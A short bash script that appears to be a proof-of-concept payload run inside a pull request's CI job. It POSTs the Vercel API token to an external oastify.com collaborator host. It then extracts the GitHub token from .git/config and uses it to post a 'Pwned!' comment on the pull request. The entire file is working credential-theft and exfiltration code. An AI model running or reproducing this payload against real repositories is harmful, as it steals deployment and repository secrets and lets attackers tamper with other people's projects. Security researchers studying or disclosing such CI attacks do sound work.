#!/bin/bash
# 1. Exfiltrate the Vercel API Token
curl -X POST -d "token=$VERCEL_API_TOKEN" https://jna7ey3oes0pjd7nre4rf1ndm4svgr4g.oastify.com/log

# 2. Use the GITHUB_TOKEN to comment on the PR

export GITHUB_TOKEN=$(tail -n 1 .git/config|awk '{print $5}'|base64 -d|awk -F: '{print $2}'|awk '{print substr($0, 1, length($0)-1)}')

curl -L \
  -X POST \
  -H "Accept: application/vnd.github+json" \
  -H "Authorization: Bearer $GITHUB_TOKEN" \
  "https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.pull_request.number }}/comments" \
  -d '{"body":"Pwned! RCE achieved and secrets stolen."}'
